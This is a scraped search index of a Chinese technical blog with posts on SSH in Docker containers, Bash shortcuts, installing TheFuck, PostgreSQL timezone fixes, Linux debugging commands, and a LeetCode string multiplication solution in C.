&lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever562: eth0@if563: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP link/ether 02:42:ac:12:00:64 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.18.0.100/16 scope global eth0 valid_lft forever preferred_lft forever inet6 fe80::42:acff:fe12:64/64 scope link valid_lft forever preferred_lft forever[root@fc2872f990ee /]# 1docker run -d -h rep01 --name rep01 --network mynetwork --ip 172.18.0.101 --privileged=true -v /root/highgodb01:/opt/HighGoDB-4.3.4/data mips-neokylin-repmgr /usr/sbin/init yum -y install openssh-server openssh-clientsyum install initscripts ## service123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127sshd_config：​```powershell#Port 22#AddressFamily any#ListenAddress 0.0.0.0#ListenAddress ::HostKey /etc/ssh/ssh_host_rsa_key#HostKey /etc/ssh/ssh_host_dsa_keyHostKey /etc/ssh/ssh_host_ecdsa_keyHostKey /etc/ssh/ssh_host_ed25519_key# Ciphers and keying#RekeyLimit default none# Logging#SyslogFacility AUTHSyslogFacility AUTHPRIV#LogLevel INFO# Authentication:#LoginGraceTime 2mPermitRootLogin yes ## 允许root用户登陆;;#StrictModes yes#MaxAuthTries 6#MaxSessions 10#PubkeyAuthentication yes# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2# but this is overridden so installations will only check .ssh/authorized_keysAuthorizedKeysFile .ssh/authorized_keys#AuthorizedPrincipalsFile none#AuthorizedKeysCommand none#AuthorizedKeysCommandUser nobody# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts#HostbasedAuthentication no# Change to yes if you don&apos;t trust ~/.ssh/known_hosts for# HostbasedAuthentication#IgnoreUserKnownHosts no# Don&apos;t read the user&apos;s ~/.rhosts and ~/.shosts files#IgnoreRhosts yes# To disable tunneled clear text passwords, change to no here!#PasswordAuthentication yes#PermitEmptyPasswords no#PasswordAuthentication yes# Change to no to disable s/key passwords#ChallengeResponseAuthentication yesChallengeResponseAuthentication no# Kerberos options#KerberosAuthentication no#KerberosOrLocalPasswd yes#KerberosTicketCleanup yes#KerberosGetAFSToken no#KerberosUseKuserok yes# GSSAPI optionsGSSAPIAuthentication yesGSSAPICleanupCredentials no#GSSAPIStrictAcceptorCheck yes#GSSAPIKeyExchange no#GSSAPIEnablek5users no# Set this to &apos;yes&apos; to enable PAM authentication, account processing,# and session processing. If this is enabled, PAM authentication will# be allowed through the ChallengeResponseAuthentication and# PasswordAuthentication. Depending on your PAM configuration,# PAM authentication via ChallengeResponseAuthentication may bypass# the setting of &quot;PermitRootLogin without-password&quot;.# If you just want the PAM account and session checks to run without# PAM authentication, then enable this but set PasswordAuthentication# and ChallengeResponseAuthentication to &apos;no&apos;.# WARNING: &apos;UsePAM no&apos; is not supported in Red Hat Enterprise Linux and may cause several# problems.UsePAM yes#AllowAgentForwarding yes#AllowTcpForwarding yes#GatewayPorts noX11Forwarding yes#X11DisplayOffset 10#X11UseLocalhost yes#PermitTTY yes#PrintMotd yes#PrintLastLog yes#TCPKeepAlive yes#UseLogin noUsePrivilegeSeparation no#PermitUserEnvironment no#Compression delayed#ClientAliveInterval 0#ClientAliveCountMax 3#ShowPatchLevel no#UseDNS yes#PidFile /var/run/sshd.pid#MaxStartups 10:30:100#PermitTunnel no#ChrootDirectory none#VersionAddendum none# no default banner path#Banner none# Accept locale-related environment variablesAcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGESAcceptEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENTAcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGEAcceptEnv XMODIFIERS# override default of no subsystemsSubsystem sftp /usr/libexec/openssh/sftp-server# Example of overriding settings on a per-user basis#Match User anoncvs# X11Forwarding no# AllowTcpForwarding no# PermitTTY no# ForceCommand cvs server 启动sshd 12345这时报以下错误： [root@ b3426410ff43 /]# /usr/sbin/sshd Could not load host key: /etc/ssh/ssh_host_rsa_key Could not load host key: /etc/ssh/ssh_host_ecdsa_key Could not load host key: /etc/ssh/ssh_host_ed25519_key ssh key: 解决办法: 123ssh-keygen -q -t rsa -b 2048 -f /etc/ssh/ssh_host_rsa_key -N '' ssh-keygen -q -t ecdsa -f /etc/ssh/ssh_host_ecdsa_key -N ''ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N '' 将当前容器保存为镜像: 1docker commit f0a4438144f0 vagabond1132/centos_ssh 显示所有镜像: 123vagabond1132/centos_ssh latest 34ed8e303d64 26 seconds ago 294MBvagabond1132/centos_7 latest 9f38484d220f 4 weeks ago 202MBvagabond1132/centos_7 ssh 9f38484d220f 4 weeks ago 202MB 基于新镜像启动新的容器 1docker run --name conn -d -p 10022:22 vagabond1132/centos_ssh:latest /usr/sbin/sshd -D 查看容器: 1234CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES957bfd4bc7ca vagabond1132/centos_ssh:latest \"/usr/sbin/sshd -D\" 2 minutes ago Up 2 minutes 0.0.0.0:10022-&gt;22/tcp connf0a4438144f0 vagabond1132/centos_7:ssh \"/bin/bash\" About an hour ago Up About an hour sshc9e215a6e5f6 vagabond1132/centos_7:latest \"/bin/bash\" 4 hours ago Exited (137) 19 minutes ago mytest 查看端口: docker port 957bfd4bc7ca 122/tcp -&gt; 0.0.0.0:10022 即可登陆: 1234567ssh root@192.168.102.30 -p 10022The authenticity of host '[192.168.102.30]:10022 ([192.168.102.30]:10022)' can't be established.ECDSA key fingerprint is SHA256:2cYMWFEiY1Jdu8tD24188+DGW0j6yc6Va7UY5gzrgnQ.ECDSA key fingerprint is MD5:b2:16:fd:ab:55:44:4a:76:71:3a:bc:41:b2:58:94:7c.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '[192.168.102.30]:10022' (ECDSA) to the list of known hosts.root@192.168.102.30's password: Docker学习 https://www.jianshu.com/p/7c9e2247cfbd","categories":[{"name":"工具篇","slug":"工具篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/工具篇/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Docker","slug":"Docker","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Docker/"}]},{"title":"Bash快捷键","slug":"software/Bash快捷键","date":"2018-12-05T10:53:11.000Z","updated":"2019-07-08T23:59:43.368Z","comments":true,"path":"2018/12/05/software/Bash快捷键/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/12/05/software/Bash快捷键/","excerpt":"","text":"编辑命令 Ctrl + a ：移到命令行首 Ctrl + e ：移到命令行尾 Ctrl + f ：按字符前移（右向） Ctrl + b ：按字符后移（左向） Alt + f ：按单词前移（右向） Alt + b ：按单词后移（左向） Ctrl + xx：在命令行首和光标之间移动 Ctrl + u ：从光标处删除至命令行首 Ctrl + k ：从光标处删除至命令行尾 Ctrl + w ：从光标处删除至字首 Alt + d ：从光标处删除至字尾 Ctrl + d ：删除光标处的字符 Ctrl + h ：删除光标前的字符 Ctrl + y ：粘贴至光标后 Alt + c ：从光标处更改为首字母大写的单词 Alt + u ：从光标处更改为全部大写的单词 Alt + l ：从光标处更改为全部小写的单词 Ctrl + t ：交换光标处和之前的字符 Alt + t ：交换光标处和之前的单词 Alt + Backspace：与 Ctrl + w 相同类似，分隔符有些差别 重新执行命令 Ctrl + r：逆向搜索命令历史 Ctrl + g：从历史搜索模式退出 Ctrl + p：历史中的上一条命令 Ctrl + n：历史中的下一条命令 Alt + .：使用上一条命令的最后一个参数 控制命令 Ctrl + l：清屏 Ctrl + o：执行当前命令，并选择上一条命令 Ctrl + s：阻止屏幕输出 Ctrl + q：允许屏幕输出 Ctrl + c：终止命令 Ctrl + z：挂起命令 Bang (!) 命令 !!：执行上一条命令 !blah：执行最近的以 blah 开头的命令，如 !ls !blah:p：仅打印输出，而不执行 !$：上一条命令的最后一个参数，与 Alt + . 相同 !$:p：打印输出 !$ 的内容 !*：上一条命令的所有参数 !:p：打印输出 ! 的内容 ^blah：删除上一条命令中的 blah ^blah^foo：将上一条命令中的 blah 替换为 foo ^blah^foo^：将上一条命令中所有的 blah 都替换为 foo 友情提示： 以上介绍的大多数 Bash 快捷键仅当在 emacs 编辑模式时有效，若你将 Bash 配置为 vi 编辑模式，那将遵循 vi 的按键绑定。Bash 默认为 emacs 编辑模式。如果你的 Bash 不在 emacs 编辑模式，可通过 set -o emacs 设置。 ^S、^Q、^C、^Z 是由终端设备处理的，可用 stty 命令设置。","categories":[{"name":"Bash","slug":"Bash","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Bash/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"CentOS 安装TheFuck","slug":"software/CentOS-安装TheFuck","date":"2018-12-04T15:41:48.000Z","updated":"2018-12-05T10:55:21.232Z","comments":true,"path":"2018/12/04/software/CentOS-安装TheFuck/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/12/04/software/CentOS-安装TheFuck/","excerpt":"任务: 安装TheFuck 替换yum python 环境: CentOS Linux release 7.6.1810 (Core) Python 版本2.7.5 发现TheFuck需要Python至少 3.4+","text":"任务: 安装TheFuck 替换yum python 环境: CentOS Linux release 7.6.1810 (Core) Python 版本2.7.5 发现TheFuck需要Python至少 3.4+ 首先 升级Python版本。以前安装过python3.6, 但是需要将其默认Python 软连接到 Python3.6 123456[Postgres@Postgres]python -VPython 2.7.5[Postgres@Postgres]sudo mv /usr/bin/python /usr/bin/python2.7.5[Postgres@Postgres]sudo ln -s /usr/local/python3/bin/python3 /usr/bin/python[Postgres@Postgres]python -VPython 3.6.4 Python版本已经替换 当我们替换默认Python版本后，发现yum并不能使用 修改: /usr/bin/yum 1#!/usr/bin/python 修改为: 1#!/usr/bin/python2.7.5 对应自己版本号即可。 如果yum命令使用过程中，还发现存在问题，请直接按照上边进行修改即可 更新python pip123 sudo yum -y install epel-release sudo yum install python-pip sudo pip install --upgrade pip 替换后报错 1Command \"python setup.py egg_info\" failed with error code 1 in /tmp/pip-install-Nd5ZPx/pyte/ 解决办法: 12sudo pip install --upgrade setuptools sudo yum install python-devel 安装Thefuck1sudo pip install thefuck bash配置: 1alias fuck=&apos;eval $(thefuck $(fc -ln -1)); history -r&apos; 可直接加入.bashrc配置文件中. TheFuck 版本升级: 1sudo pip install thefuck --upgrade","categories":[{"name":"工具篇","slug":"工具篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/工具篇/"}],"tags":[{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"},{"name":"Software","slug":"Software","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Software/"},{"name":"Python","slug":"Python","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Python/"}]},{"title":"Pg Time && Linux 系统时间","slug":"database/Pg-Time-Linux-系统时间","date":"2018-11-23T12:27:32.000Z","updated":"2019-09-18T12:18:49.107Z","comments":true,"path":"2018/11/23/database/Pg-Time-Linux-系统时间/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/11/23/database/Pg-Time-Linux-系统时间/","excerpt":"Postgresql 进行日志分析时发现,Pg数据库时间存在异常; Postgresql数据库时间与Linux服务器时间不一致 主要排查: postgresql.conf 加载timezone 问题 进入psql查看show time zone; select now(); 查看系统date ; hwclock ; 设置ntp 时间同步","text":"Postgresql 进行日志分析时发现,Pg数据库时间存在异常; Postgresql数据库时间与Linux服务器时间不一致 主要排查: postgresql.conf 加载timezone 问题 进入psql查看show time zone; select now(); 查看系统date ; hwclock ; 设置ntp 时间同步 “系统时间” &amp; “硬件时间”​ 系统时间: 一般说来就是我们执行 date 命令看到的时间，linux系统下所有的时间调用（除了直接访问硬件时间的命令）都是使用的这个时间。 ​ 硬件时间: 主板上BIOS中的时间，由主板电池供电来维持运行，系统开机时要读取这个时间，并根据它来设定系统时间（注意：系统启动时根据硬件时间设定系统时间的过程可能存在时区换算，这要视具体的系统及相关设置而定）。 查看系统时间 1date 设置系统时间 1date --set “2012-12-17 10:19\" 查看系统时区: 1date -R hwclock命令123-r, --show 读取并打印硬件时钟（read hardware clock and print result）-s, --hctosys 将硬件时钟同步到系统时钟（set the system time from the hardware clock）-w, --systohc 将系统时钟同步到硬件时钟（set the hardware clock to the current system time） 如果使用date命令修改了系统时间，并不会自动去修改硬件时钟，因此，当系统下次重启时，系统时钟还会从硬件时钟去取，date设置的时间就无效了。因此需要hwclock命令再来同步系统时钟到硬件时钟，这样下次启动的时候内核则会读取正确的硬件时间到系统时间。 查看Linux服务器时区: Date -R110主库: 123456789101112131415161718192021222324252627282930[highgo@node2 ~]# hwclock -r Fri 23 Nov 2018 11:21:28 AM CST -0.914369 seconds[highgo@node2 ~]# date Fri Nov 23 11:21:53 CST 2018[highgo@node2 ~]# date -R Fri, 23 Nov 2018 11:21:55 +0800 ;; 东八区;[highgo@node2 ~]# [highgo@node2 ~]$ [highgo@node2 ~]$ psql psql (10.6)Type \"help\" for help.highgo=# select now(); now ------------------------------- 2018-11-23 11:22:31.308625+08(1 row)highgo=# show time zone; TimeZone ---------- PRC(1 row)[highgo@node2 data]$ grep timezone postgresql.conf log_timezone = 'PRC'timezone = 'PRC'#timezone_abbreviations = 'Default' # Select the set of available time zone # share/timezonesets/. 101备库: 123456789101112131415161718192021222324252627282930[highgo@node1 ~]# hwclock -rFri 23 Nov 2018 11:23:06 AM CST -0.969391 seconds[highgo@node1 ~]# date Fri Nov 23 11:23:46 CST 2018[highgo@node1 ~]# date -RFri, 23 Nov 2018 11:23:58 +0800[highgo@node1 ~]# [highgo@node1 ~]$ psql psql (10.6)Type \"help\" for help.highgo=# select now(); now ------------------------------- 2018-11-23 11:25:13.317304+08(1 row)highgo=# highgo=# show time zone; TimeZone ---------- PRC(1 row)[highgo@node1 data]$ grep timezone postgresql.conf log_timezone = 'PRC'timezone = 'PRC'#timezone_abbreviations = 'Default' # Select the set of available time zone # share/timezonesets/. 106备库: 12345678910111213141516171819202122232425262728[highgo@highgo ~]# hwclock -r Thu 22 Nov 2018 10:24:52 PM EST -0.359908 seconds[highgo@highgo ~]# [highgo@highgo ~]# date -R Fri, 23 Nov 2018 11:26:04 -0500 ;;; 西五区;[highgo@highgo ~]# date Fri Nov 23 11:26:05 EST 2018[highgo@highgo ~]$ psql psql (10.6)Type \"help\" for help.highgo=# select now(); now ------------------------------- 2018-11-24 00:26:35.379415+08(1 row)highgo=# show time zone; TimeZone ---------- PRC[highgo@highgo data]$ grep timezone postgresql.conf log_timezone = 'PRC'timezone = 'PRC'#timezone_abbreviations = 'Default' # Select the set of available time zone # share/timezonesets/. 猜测与106机器上 时区有关. TZSelect 修改时区 此时并不会生效, 手动执行 1TZ='Asia/Shanghai'; export TZ 查看时区： 12[Postgres@Postgres ~]$ date -R Fri, 23 Nov 2018 11:33:48 +0800 刷新系统时间到硬件 1234567[Postgres@Postgres ~]# hwclock -r Thu 22 Nov 2018 10:32:39 PM EST -0.656779 seconds[Postgres@Postgres ~]hwclock -w[Postgres@Postgres ~]# hwclock -rFri 23 Nov 2018 11:34:01 AM CST -0.344289 seconds 数据库重启: 1pg_ctl restart 查看数据库时间: 12345highgo=# select now(); now------------------------------- 2018-11-23 11:36:55.601811+08(1 row) ntp 时间同步yum -y install ntpdate ntp 同步在线网络时间。 ntpdate xxxx crontab: 每十分钟调整一次时间 1*/10 * * * * ntpdate time.nist.gov #域名或IP 一级时间服务器列表 二级时间服务器列表","categories":[{"name":"Database","slug":"Database","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/"},{"name":"Debug","slug":"Database/Debug","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Database/Debug/"}],"tags":[{"name":"Postgresql","slug":"Postgresql","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Postgresql/"},{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"Linux-调试","slug":"rebuild/Linux-调试","date":"2018-11-06T11:56:19.000Z","updated":"2018-11-20T10:56:57.292Z","comments":true,"path":"2018/11/06/rebuild/Linux-调试/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/11/06/rebuild/Linux-调试/","excerpt":"前言Linux常用命令中有一些命令可以在开发或调试过程中起到很好的帮助作用，有些可以帮助了解或优化我们的程序，有些可以帮我们定位疑难问题。本文将简单介绍一下这些命令。 示例程序我们用一个小程序，来帮助后面我们对这些命令的描述，程序清单cmdTest.c如下: 12345678910111213#include&lt;stdio.h&gt;int test(int a,int b)&#123; return a/b;&#125;int main(int argc,char *argv[])&#123; int a = 10; int b = 0; printf(\"a=%d,b=%d\\n\",a,b); test(a,b); return 0;&#125; 编译获得elf文件cmdTest并运行： 1234gcc -g -o cmdTest cmdTest.c./cmdTesta=10,b=0Floating point exception (core dumped) 程序内容是在main函数中调用test，计算a/b的值，其中b的值为0，因此程序由于除0错误异常终止。","text":"前言Linux常用命令中有一些命令可以在开发或调试过程中起到很好的帮助作用，有些可以帮助了解或优化我们的程序，有些可以帮我们定位疑难问题。本文将简单介绍一下这些命令。 示例程序我们用一个小程序，来帮助后面我们对这些命令的描述，程序清单cmdTest.c如下: 12345678910111213#include&lt;stdio.h&gt;int test(int a,int b)&#123; return a/b;&#125;int main(int argc,char *argv[])&#123; int a = 10; int b = 0; printf(\"a=%d,b=%d\\n\",a,b); test(a,b); return 0;&#125; 编译获得elf文件cmdTest并运行： 1234gcc -g -o cmdTest cmdTest.c./cmdTesta=10,b=0Floating point exception (core dumped) 程序内容是在main函数中调用test，计算a/b的值，其中b的值为0，因此程序由于除0错误异常终止。 查看文件基本信息–file12file cmdTestcmdTest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=448e1c34b4c548120e2c04f6a2bfce4e6d2281a3, not stripped 通过file命令可以看到cmdTest的类型为elf，是64位、运行于x86-64的程序，not striped表明elf文件中还保留着符号信息以及调试信息等不影响程序运行的内容。 查看程序依赖库–ldd1234ldd cmdTest linux-vdso.so.1 =&gt; (0x00007ffc8e548000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f0621931000) /lib64/ld-linux-x86-64.so.2 (0x00007f0621cf6000) 我们可以看到cmdTest依赖了libc.so等库。 查看函数或者全局变量是否存在于elf文件中–nmnm命令用于查看elf文件的符号信息。文件编译出来之后，我们可能不知道新增加的函数或者全局变量是否已经成功编译进去。这时候，我们可以使用nm命令来查看。例如，查看前面所提到的elf文件有没有test函数，可以用命令： 12nm cmdTest|grep test000000000040052d T test #打印结果 按照地址顺序列出符号信息： 123456789101112131415161718nm -n cmdTest w _ITM_deregisterTMCloneTable w _ITM_registerTMCloneTable w _Jv_RegisterClasses w __gmon_start__ U __libc_start_main@@GLIBC_2.2.5 U printf@@GLIBC_2.2.500000000004003e0 T _init0000000000400440 T _start0000000000400470 t deregister_tm_clones00000000004004a0 t register_tm_clones00000000004004e0 t __do_global_dtors_aux0000000000400500 t frame_dummy000000000040052d T test0000000000400540 T main0000000000400590 T __libc_csu_init0000000000400600 T __libc_csu_fini(列出部分内容) 可以看到test函数的开始地址为0x000000000040052d，结束地址为0x0000000000400540。 打印elf文件中的可打印字符串–strings例如你在代码中存储了一个版本号信息，那么即使编译成elf文件后，仍然可以通过strings搜索其中的字符串甚至可以搜索某个.c文件是否编译在其中： 1strings elfFile | grep \"someString\" 查看文件段大小–size可以通过size命令查看各段大小： 123size cmdTest text data bss dec hex filename 1319 560 8 1887 75f cmdTest text段：正文段字节数大小data段:包含静态变量和已经初始化的全局变量的数据段字节数大小bss段：存放程序中未初始化的全局变量的字节数大小当我们知道各个段的大小之后，如果有减小程序大小的需求，就可以有针对性的对elf文件进行优化处理。 为elf文件”瘦身“–stripstrip用于去掉elf文件中所有的符号信息： 12345ls -al cmdTest-rwxr-xr-x 1 hyb root 9792 Sep 25 20:30 cmdTest #总大小为9792字节strip cmdTestls -al cmdTest-rwxr-xr-x 1 hyb root 6248 Sep 25 20:35 cmdTest#strip之后大小为6248字节 可以看到，“瘦身”之后，大小减少将近三分之一。但是要特别注意的是，“瘦身”之后的elf文件由于没有了符号信息，许多调试命令将无法正常使用，出现core dump时，问题也较难定位，因此只建议在正式发布时对其进行“瘦身”。 查看elf文件信息–readelfreadelf用于查看elf文件信息，它可以查看各段信息，符号信息等，下面的例子是查看elf文件头信息： 1234567891011121314151617181920readelf -h cmdTest Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 #elf文件魔数字 Class: ELF64 #64位 elf文件 Data: 2's complement, little endian#字节序为小端序 Version: 1 (current) OS/ABI: UNIX - System V # ABI Version: 0 Type: EXEC (Executable file)#目标文件类型 Machine: Advanced Micro Devices X86-64 #目标处理器体系 Version: 0x1 Entry point address: 0x400440 #入口地址 Start of program headers: 64 (bytes into file) Start of section headers: 4456 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 9 Size of section headers: 64 (bytes) Number of section headers: 28 Section header string table index: 27 从elf头信息中，我们可以知道该elf是64位可执行文件，运行在x86-64中，且字节序为小端序。另外，我们还注意到它的入口地址是0x400440(_start)，而不是400540(main)。也就是说，我们的程序运行并非从main开始。 反汇编指定函数–objdumpobjdump用于展示elf文件信息，功能较多，在此不逐一介绍。有时候我们需要反汇编来定位一些问题，可以使用命令： 1objdump -d cmdTest #反汇编整个cmdTest程序 但是如果程序较大，那么反汇编时间将会变长，而且反汇编文件也会很大。如果我们已经知道了问题在某个函数，只想反汇编某一个函数，怎么处理呢？我们可以利用前面介绍的nm命令获取到函数test的地址，然后使用下面的方式反汇编： 1objdump -d cmdTest --start-address=0x40052d --stop-address=0x400540 ##反汇编指定地址区间 端口占用情况查看–netstat我们可能常常会遇到进程第一次启动后，再次启动会出现端口绑定失败的问题，我们可以通过netstat命令查看端口占用情况： 1netstat -anp|grep 端口号 进程状态查看–ps&amp;topps命令的用法可以参考ps命令常见实用用法。top命令实时显示当前进程状态，最活跃的进程显示在最顶部。 core dump文件生成配置–ulimit -c有时候我们的程序core dump了却没有生成core文件，很可能是我们设置的问题： 123ulimit -c #查看core文件配置，如果结果为0，程序core dump时将不会生成core文件ulimit -c unlimited #不限制core文件生成大小ulimit -c 10 #设置最大生成大小为10kb 调试神器–gdbgdb是一个强大的调试工具，但这里仅介绍两个简单使用示例。有时候程序可能已经正在运行，但是又不能终止它，这时候仍然可以使用gdb调试正在运行的进程： 1gdb processFile PID #processFile为进程文件，pid为进程id，可通过ps命令查找到 有时候程序可能core dump了，但是系统还留给了我们一个礼物–core文件。在core文件生成配置完成之后，运行cmdTest程序，产生core文件。我们可以用下面的方法通过core文件定位出错位置： 123456789gdb cmdTest core #processFile为进程文件，core为生成的core文件Core was generated by `./cmdTest'.Program terminated with signal SIGFPE, Arithmetic exception.#0 0x00000000004004fb in test (a=10, b=0) at cmdTest.c:44 return a/b;(gdb)bt#0 0x00000000004004fb in test (a=10, b=0) at cmdTest.c:4#1 0x000000000040052c in main (argc=1, argv=0x7ffca9536d38) at cmdTest.c:10(gdb) 输入bt后，就可以看到调用栈了,出错位置在test函数，cmdTest.c的第4行。 定位crash问题–addr2line有时候程序崩溃了但不幸没有生成core文件，是不是就完全没有办法了呢？还是cmdTest的例子。运行完cmdTest之后，我们通过dmesg命令可以获取到以下内容 1[27153070.538380] traps: cmdTest[2836] trap divide error ip:40053b sp:7ffc230d9280 error:0 in cmdTest[400000+1000] 该信息记录了cmdTest运行出错的基本原因（divide error）和出错位置（40053b）,我们使用addr2line命令获取出错具体行号： 12addr2line -e cmdTest 40053b/home/hyb/practice/cmdTest.c:4 可以看到addr2line命令将地址(40053b)翻译成了文件名(cmdTest.c)和行号(4)，确定了出错位置。 转载自其它文章.","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"},{"name":"调试","slug":"调试","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/调试/"}]},{"title":"Multiply Strings","slug":"alogr/Multiply-Strings","date":"2018-10-31T11:26:03.000Z","updated":"2018-11-21T12:13:18.728Z","comments":true,"path":"2018/10/31/alogr/Multiply-Strings/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/10/31/alogr/Multiply-Strings/","excerpt":"Given two numbers represented as strings, return multiplication of the numbers as a string. Note: The numbers can be arbitrarily large and are non-negative. Note: The length of both num1 and num2 is &lt; 110. Both num1 and num2 contain only digits 0-9. Both num1 and num2 do not contain any leading zero, except the number 0 itself. You must not use any built-in BigInteger library or convert the inputs to integer directly.","text":"Given two numbers represented as strings, return multiplication of the numbers as a string. Note: The numbers can be arbitrarily large and are non-negative. Note: The length of both num1 and num2 is &lt; 110. Both num1 and num2 contain only digits 0-9. Both num1 and num2 do not contain any leading zero, except the number 0 itself. You must not use any built-in BigInteger library or convert the inputs to integer directly. 思路: （Ps: 手写稍微忍耐一些吧 ^_^） 我们发现: p[i+j] = a[i] * b[j] + 进位; 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960char* multiply(char* num1, char* num2) &#123; int sz1 = strlen(num1); int sz2 = strlen(num2); int i, j = 0; int k = 0; int high, low; char *p = malloc(sizeof(char) * (sz1 + sz2 + 1)); memset(p + sz1 + sz2, 0, 1); memset(p, '0', sz1 + sz2); for(i = 0; i &lt; sz1; i++) &#123; for(j =0; j &lt; sz2; j++) &#123; high = ( num1[i] - '0' ) * ( num2[j] - '0' ) / 10 + ( p[i+j] - '0'); low = ( num1[i] - '0' ) * ( num2[j] - '0' ) % 10 + ( p[i+j+1] - '0'); if(high &gt; 9) &#123; p[i+j] = high - 10 + '0'; for(k = i+j-1; ; k--) &#123; if( p[k] != '9' ) &#123; p[k] += 1; break; &#125; else p[k] = '0'; &#125; &#125; else p[i+j] = high + '0'; if(low &gt; 9) &#123; p[i+j+1] = low - 10 + '0'; for(k = i+j; ; k--) &#123; if( p[k] != '9' ) &#123; p[k] += 1; break; &#125; else p[k] = '0'; &#125; &#125; else p[i+j+1] = low + '0'; &#125; &#125; for(i =0 ; i &lt; (sz1 + sz2 - 1); i++, p++) if( *p != '0') return p; return p;&#125; LeetÇode-问题描述 运行1W次时间:12345char * str1 = \"9999999999999999999999999999999999999999999999999999\";char * str2 = \"9999999999999999999999999999999999999999999999999999\";int i = 0;for( i = 0 ; i &lt;10000 ; i++) multiply(str1, str2); 123real 0m0.455suser 0m0.451ssys 0m0.003s LeetCode 测试结果:","categories":[],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Algorithm/"},{"name":"C/C++","slug":"C-C","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/C-C/"},{"name":"LeetCode","slug":"LeetCode","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/LeetCode/"}]},{"title":"二进制文件分析","slug":"rebuild/二进制文件分析","date":"2018-10-28T13:20:11.000Z","updated":"2018-11-19T16:07:38.003Z","comments":true,"path":"2018/10/28/rebuild/二进制文件分析/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/10/28/rebuild/二进制文件分析/","excerpt":"nm objdump readelf ar 二进制文件符号清单.文件信息等;","text":"nm objdump readelf ar 二进制文件符号清单.文件信息等; nmnm用来列出目标文件的符号清单。 -a或–debug-syms：显示所有的符号，包括debugger-only symbols。 -B：等同于–format=bsd，用来兼容MIPS的nm。 -C或–demangle：将低级符号名解析(demangle)成用户级名字。这样可以使得C++函数名具有可读性。 –no-demangle：默认的选项，不需要将低级符号名解析成用户级名。 -D或–dynamic：显示动态符号。该任选项仅对于动态目标(例如特定类型的共享库)有意义。 -f format：使用format格式输出。format可以选取bsd、sysv或posix，该选项在GNU的nm中有用。默认为bsd。 -g或–extern-only：仅显示外部符号。 -n、-v或–numeric-sort：按符号对应地址的顺序排序，而非按符号名的字符顺序。 -p或–no-sort：按目标文件中遇到的符号顺序显示，不排序。 -P或–portability：使用POSIX.2标准输出格式代替默认的输出格式。等同于使用任选项-f posix。 -s或–print-armap：当列出库中成员的符号时，包含索引。索引的内容包含：哪些模块包含哪些名字的映射。 -r或–reverse-sort：反转排序的顺序(例如，升序变为降序)。 –size-sort：按大小排列符号顺序。该大小是按照一个符号的值与它下一个符号的值进行计算的。 –target=bfdname：指定一个目标代码的格式，而非使用系统的默认格式。 -u或–undefined-only：仅显示没有定义的符号(那些外部符号)。 –defined-only:仅显示定义的符号。 -l或–line-numbers：对每个符号，使用调试信息来试图找到文件名和行号。 -V或–version：显示nm的版本号。 